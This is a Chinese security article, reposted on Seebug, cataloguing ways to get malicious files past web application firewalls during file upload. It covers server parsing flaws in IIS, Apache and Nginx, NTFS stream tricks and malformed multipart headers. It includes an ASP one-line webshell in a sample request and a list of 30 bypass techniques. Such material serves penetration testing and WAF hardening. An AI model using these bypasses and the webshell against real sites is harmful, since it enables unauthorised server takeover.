原文链接：[先知技术社区](https://xianzhi.aliyun.com/forum/read/458.html)

作者：[Tr3jer_CongRong](www.Thinkings.org)  

前文回顾：[我的WafBypass之道（SQL注入篇）](http://paper.seebug.org/218/)

## 0x00 前言

玩waf当然也要讲究循序渐进，姊妹篇就写文件上传好了，感觉也就SQLi和Xss的WafBypass最体现发散性思维的，而文件上传、免杀、权限提升这几点的Bypass更需要的是实战的经验。本文内容为沉淀下来的总结以及一些经典案例。想到哪写到哪，所以可能不是很全。创造姿势不易，且行且珍惜。（案例图不好上，毕竟是upload的Bypass，就直接上姿势）

阅读此文你会发现新老姿势都有，因为我是想系统的写一写，文件上无非就是结合各种特性或waf缺陷。辍写时想过一个问题，如何归拢哪些属于文件上传Bypass的范畴？打个比方：

    
    
    上传正常.jpg的图片 #成功
    上传正常.php #拦截
    绕过.php文件的filename后进行上传 #成功
    使用绕过了filename的姿势上传恶意.php #拦截

以上这么个逻辑通常来讲是waf检测到了正文的恶意内容。再继续写的话就属于免杀的范畴了，过于模糊并且跑题了，并不是真正意义上的文件上传Bypass，那是写不完的。

## 0x01 搞起

上传文件（歪脖骚）时waf会检查哪里？

    
    
    请求的url
    Boundary边界
    MIME类型
    文件扩展名
    文件内容

常见扩展名黑名单：

    
    
    asp|asa|cer|cdx|aspx|ashx|ascx|asax
    php|php2|php3|php4|php5|asis|htaccess
    htm|html|shtml|pwml|phtml|phtm|js|jsp
    vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini

个人写的“稍微”全一点，实际上waf的黑名单就不一定这么全了。

测试时的准备工作：

  * 什么语言？什么容器？什么系统？都什么版本？
  * 上传文件都可以上传什么格式的文件？还是允许上传任意类型？
  * 上传的文件会不会被重命名或者二次渲染？

## 0x02 容器特性

> 有些很老的特性其实也是最开始绕waf的基础，这里就一笔带过了。

Apache1.X 2.X解析漏洞：

Apache在以上版本中，解析文件名的方式是从后向前识别扩展名，直到遇见Apache可识别的扩展名为止。

Win2k3 + APACHE2.0.59 + PHP
![](https://images.seebug.org/content/images/2017/02/1-4.png-w331s)

IIS6.0两个解析缺陷：

  * 目录名包含`.asp`、`.asa`、`.cer`的话，则该目录下的所有文件都将按照asp解析。例如：

![](https://images.seebug.org/content/images/2017/02/2-4.png-w331s)

  * 文件名中如果包含`.asp;`、`.asa;`、`.cer;`则优先使用asp解析。例如：

![](https://images.seebug.org/content/images/2017/02/3-2.png-w331s)

有一点需要注意，如果程序会将上传的图片进行重命名的话就gg了。

Nginx解析漏洞：

  * Nginx 0.5.*
  * Nginx 0.6.*
  * Nginx 0.7 <= 0.7.65
  * Nginx 0.8 <= 0.8.37

以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg.php进行请求。

  * Nginx 0.8.41 – 1.5.6：

以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg%20.php进行请求。

PHP CGI解析漏洞：

    
    
    IIS 7.0/7.5
    Nginx < 0.8.3

以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析。

多个Content-Disposition：

在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过。

Win2k8 + IIS7.0 + PHP
![](https://images.seebug.org/content/images/2017/02/4-2.png-w331s)

请求正文格式问题：

    
    
    Content-Disposition: form-data; name="file1"; filename="shell.asp"
    Content-Type: application/octet-stream

正常的upload请求都是以上这样，然而这个格式也并非强制性的，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：

Win2k3 + IIS6.0 + ASP
![](https://images.seebug.org/content/images/2017/02/5-2.png-w331s)

结合.htaccess指定某些文件使用php来解析：

这个方法通常用于绕过waf黑名单的，配置该目录下所有文件都将其使用php来解析：

![](https://images.seebug.org/content/images/2017/02/6-1.png-w331s)

## 0x03 系统特性

Windows特殊字符：

当我们上传一个文件的filename为shell.php{%80-%99}时：

![](https://images.seebug.org/content/images/2017/02/7-2.png-w331s)

waf可能识别为.php{%80-%99}，就会导致被绕过。

Win2k8 + IIS7.0 + PHP
![](https://images.seebug.org/content/images/2017/02/8-3.png-w331s)

exee扩展名：

上传.exe文件通常会被waf拦截，如果使用各种特性无用的话，那么可以把扩展名改为.exee再进行上传。

NTFS ADS特性：

ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的`filename`匹配不当的话可能会导致绕过。

![](https://images.seebug.org/content/images/2017/02/9-2.png-w331s)

Windows在创建文件时，在文件名末尾不管加多少点都会自动去除，那么上传时filename可以这么写`shell.php......`也可以这么写`shell.php::$DATA.......`。

Win2k8 + IIS7.0 + PHP
![](https://images.seebug.org/content/images/2017/02/10-2.png-w331s)

## 0x04 waf缺陷

匹配过于严谨：

  * 一个空格导致安全狗被绕过：

    
    
    Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099

尝试在boundary后面加个空格或者其他可被正常处理的字符：

    
    
    boundary =---------------------------4714631421141173021852555099

Win2k3 + IIS6.0 + ASP
![](https://images.seebug.org/content/images/2017/02/11-2.png-w331s)

  * 以上也能说明一个问题，安全狗在上传文件时匹配各个参数都十分严谨，不过IIS6.0以上也变的严谨了，再看看其他的地方：

每次文件上传时的Boundary边界都是一致的：

    
    
    Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099
    Content-Length: 253
    
    -----------------------------4714631421141173021852555099
    Content-Disposition: form-data; name="file1"; filename="shell.asp"
    Content-Type: application/octet-stream
    
    <%eval request("a")%>
    -----------------------------4714631421141173021852555099--
但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：

Win2k3 + IIS6.0 + ASP
![](https://images.seebug.org/content/images/2017/02/12-1.png-w331s)

修改Content-Type的MIME类型：

Win2k3 + IIS6.0 + ASP
![](https://images.seebug.org/content/images/2017/02/13.png-w331s)

ASCII > 127的字符：

![](https://images.seebug.org/content/images/2017/02/14.png-w331s)

数据过长导致的绕过：

  * waf如果对Content-Disposition长度处理的不够好的话可能会导致绕过，例如：

Win2k3 + IIS6.0 + ASP
![](https://images.seebug.org/content/images/2017/02/15.png-w331s)

  * 基于文件名：

基于构造长文件名

![](https://images.seebug.org/content/images/2017/02/16.png-w331s)

如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。

![](https://images.seebug.org/content/images/2017/02/17.png-w331s)

  * 特殊的长文件名：

文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：

    
    
    shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg

## 0x05 End

在这里放上个人之前总结的30个上传绕过姿势：

    
    
    1. filename在content-type下面
    2. .asp{80-90}
    3. NTFS ADS
    4. .asp...
    5. boundary不一致
    6. iis6分号截断asp.asp;asp.jpg
    7. apache解析漏洞php.php.ddd
    8. boundary和content-disposition中间插入换行
    9. hello.php:a.jpg然后hello.<<<
    10. filename=php.php
    11. filename="a.txt";filename="a.php"
    12. name=\n"file";filename="a.php"
    13. content-disposition:\n
    14. .htaccess文件
    15. a.jpg.\nphp
    16. 去掉content-disposition的form-data字段
    17. php<5.3 单双引号截断特性
    18. 删掉content-disposition: form-data;
    19. content-disposition\00:
    20. {char}+content-disposition
    21. head头的content-type: tab
    22. head头的content-type: multipart/form-DATA
    23. filename后缀改为大写
    24. head头的Content-Type: multipart/form-data;\n
    25. .asp空格
    26. .asp0x00.jpg截断
    27. 双boundary
    28. file\nname="php.php"
    29. head头content-type空格:
    30. form-data字段与name字段交换位置

文件上传Bypass可写的点不多，现有的姿势也不能拿出来讲（笑）重点在于上传文件时遇到waf能够准确判断所拦截的点，目光不能只盯在waf，更多的时注意后端的情况。往往是需要结合哪些语言/容器/系统版本“可以怎样”、“不可以怎样”。

PDF
版本下载：[wafbypass_upload.pdf](https://xianzhi.aliyun.com/forum/attachment/big_size/wafbypass_upload.pdf)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/219/>

